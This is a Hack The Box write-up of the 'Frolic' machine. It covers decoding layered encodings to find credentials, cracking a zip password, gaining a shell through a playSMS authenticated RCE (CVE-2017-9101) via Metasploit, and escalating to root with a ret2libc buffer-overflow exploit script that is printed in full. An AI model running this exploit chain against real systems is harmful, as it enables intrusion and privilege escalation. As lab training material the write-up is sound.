&lt;h3 id=&quot;hacking-the-hackable-form&quot;&gt;Hacking the “Hackable” form&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-source-code-&quot;&gt;Let’s take a look at the source code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-a-script-called-loginjs--maybe-authentication-is-handled-by-that-script&quot;&gt;We notice a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;login.js&lt;/code&gt; , maybe authentication is handled by that script.&lt;/h4&gt;
&lt;h4 id=&quot;loginjs-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;login.js&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById(&quot;username&quot;).value;
var password = document.getElementById(&quot;password&quot;).value;
if ( username == &quot;admin&quot; &amp;amp;&amp;amp; password == &quot;superduperlooperpassword_lol&quot;){
alert (&quot;Login successfully&quot;);
window.location = &quot;success.html&quot;; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;);
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById(&quot;username&quot;).disabled = true;
document.getElementById(&quot;password&quot;).disabled = true;
document.getElementById(&quot;submit&quot;).disabled = true;
return false;
}
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-the-username-and-the-password--adminsuperduperlooperpassword_lol&quot;&gt;We got the username and the password : admin:superduperlooperpassword_lol&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/frolic/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-after-we-login-we-find--this-&quot;&gt;And after we login we find … this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ook&quot;&gt;Ook!&lt;/h3&gt;
&lt;h4 id=&quot;after-searching-on-google-for-a-long-time-i-found-out-that-this-is-an-esoteric-language-called-ook&quot;&gt;After searching on google for a long time I found out that this is an esoteric language called &lt;code class=&quot;highlighter-rouge&quot;&gt;Ook!&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;read-about-esoteric-languages-here&quot;&gt;Read about esoteric languages &lt;a href=&quot;https://esolangs.org/wiki/Main_Page&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;read-about-ook-here&quot;&gt;Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;Ook!&lt;/code&gt; &lt;a href=&quot;https://esolangs.org/wiki/Ook!&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-used-an-online-interpreter-for-ook-on-a-website-called-dcodefr&quot;&gt;I used an &lt;a href=&quot;https://www.dcode.fr/ook-language&quot;&gt;online interpreter&lt;/a&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;Ook!&lt;/code&gt; on a website called &lt;a href=&quot;https://www.dcode.fr/&quot;&gt;dcode.fr&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;output-&quot;&gt;Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nothing here check /asdiSIAJJ0QWE9JAS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;playsms-password&quot;&gt;Playsms password&lt;/h3&gt;
&lt;h4 id=&quot;asdisiajj0qwe9jas-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/asdiSIAJJ0QWE9JAS&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;obviously-its-base64--so-i-copied-it-and-saved-it-in-a-txt-file-to-decode-it-&quot;&gt;Obviously it’s base64 , so I copied it and saved it in a &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; file to decode it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/frolic/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-weird-output--lets-redirect-the-output-into-a-file-and-check-what-kind-of-files-is-that-&quot;&gt;We got a weird output , let’s redirect the output into a file and check what kind of files is that :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-zip-archive--lets-unzip-it-&quot;&gt;It’s a zip archive , let’s unzip it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-protected-theres-a-tool-called-fcrackzip-we-can-use-it-to-bruteforce-the-password-&quot;&gt;Password protected. There’s a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt; we can use it to bruteforce the password :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-password-&quot;&gt;The password is “password” !&lt;/h4&gt;
&lt;h4 id=&quot;after-extraction-we-get-a-file-called-indexphp-&quot;&gt;After extraction we get a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;hex-encoded--lets-decode-it-i-will-use-a-website-called-cyberchef-&quot;&gt;Hex encoded , let’s decode it. I will use a website called &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;base64-encoded-output--lets-decode-one-more-time-&quot;&gt;Base64 encoded output , let’s decode one more time :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;another-esoteric-language-but-this-time-its-a-famous-one--brainfuck-we-will-use-dcodefr-again-&quot;&gt;Another esoteric language. But this time it’s a famous one , &lt;code class=&quot;highlighter-rouge&quot;&gt;brainfuck&lt;/code&gt;. We will use &lt;a href=&quot;https://www.dcode.fr/&quot;&gt;dcode.fr&lt;/a&gt; again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;output--1&quot;&gt;Output :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;idkwhatispass&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/frolic/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-to-login-to-playsms-as-admin-with-this-password-&quot;&gt;Let’s try to login to playsms as admin with this password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked&quot;&gt;And it worked.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiting-authenticated-rce-and-getting-user&quot;&gt;Exploiting Authenticated RCE and getting user&lt;/h3&gt;
&lt;h4 id=&quot;there-are-some-known-vulnerabilities-for-playsms--one-of-them-is-an-authenticated-csv-file-upload-code-execution-cve-2017-9101-theres-also-a-metasploit-module-for-it&quot;&gt;There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec&quot;&gt;metasploit module&lt;/a&gt; for it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/28.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/frolic/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-exploit-worked-and-we-have-a-meterpreter-session-now-&quot;&gt;The exploit worked and we have a meterpreter session now :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;buffer-overflow-in-rop&quot;&gt;Buffer Overflow in rop&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-the-user-ayush-theres-a-directory-called-binary--which-has-a-binary-called-rop-we-can-verify-that-rop-is-suid-by-using-find&quot;&gt;In the home directory of the user &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; there’s a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;.binary&lt;/code&gt; , which has a binary called &lt;code class=&quot;highlighter-rouge&quot;&gt;rop&lt;/code&gt;. we can verify that &lt;code class=&quot;highlighter-rouge&quot;&gt;rop&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; by using &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /home/ayush/.binary/ -perm -4000&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/frolic/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-see-what-is-it-doing-&quot;&gt;Let’s see what is it doing :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-it-takes-our-input-and-just-ouputs-it--lets-try-giving-it-a-long-string-&quot;&gt;So it takes our input and just ouputs it , Let’s try giving it a long string :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-segmentation-fault--so-we-have-a-buffer-overflow-i-will-go-through-the-exploitation-without-explaining-everything-because-i-have-already-written-some-posts-about-buffer-overflow-you-can-check-them-here&quot;&gt;We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-are-going-to-do-a-ret2libc-attack--if-you-are-unfamiliar-with-it--you-can-read-my-post-about-it-here&quot;&gt;We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it &lt;a href=&quot;/binary-exploitation/bof6/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-of-all--gdb-is-not-installed-on-the-box-&quot;&gt;First of all , &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; is not installed on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-download-a-static-version-of-gdb-from-github--and-uploaded-it-to-the-box-through-the-meterpreter-session-upload-gdb&quot;&gt;So I download a static version of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; from &lt;a href=&quot;https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32&quot;&gt;github&lt;/a&gt; , and uploaded it to the box through the meterpreter session. &lt;code class=&quot;highlighter-rouge&quot;&gt;upload gdb&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-find-the-length-of-the-buffer-&quot;&gt;Let’s find the length of the buffer :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/36.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/frolic/37.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/frolic/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-the-buffer-overflows-after-52-chars-now-we-need-to-know-the-address-of-binsh--i-wont-do-it-like-i-did-before-by-loading-the-string-in-a-environment-variable-theres-a-better-way-to-do-it--first-thing-we-need-to-find-the-offset-of-binsh-in-libc--we-will-use-strings-to-get-the-address-&quot;&gt;So the buffer overflows after 52 chars. Now we need to know the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; , we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; to get the address :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/frolic/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;offset--0x0015ba0b&quot;&gt;Offset : &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0015ba0b&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-need-the-address-of-libc--we-can-use-ldd-to-get-it-&quot;&gt;Then we need the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; , we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; to get it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldd rop&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/frolic/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;address--0xb7e19000&quot;&gt;Address : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e19000&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-will-add-the-two-addresses-to-get-the-address-of-binsh&quot;&gt;Then we will add the two addresses to get the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;address-of-binsh--0x0015ba0b--0xb7e19000--0xb7f74a0b&quot;&gt;Address of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0015ba0b&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e19000&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7f74a0b&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-the-addresses-of-system-and-exit-&quot;&gt;Now we need the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;address-of-system--0xb7e53da0&quot;&gt;Address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e53da0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;address-of-exit--0xb7e479d0&quot;&gt;Address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e479d0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;our-final-exploit-will-be&quot;&gt;Our final exploit will be:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb7e53da0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb7e479d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb7f74a0b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-upload-and-run-it-&quot;&gt;Let’s upload and run it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./rop `python /tmp/exploit.py`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---carrier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/carrier/&quot;&gt;Hack The Box - Carrier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---curling&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/curling/&quot;&gt;Hack The Box - Curling&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;amp;&amp;amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … thisok! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 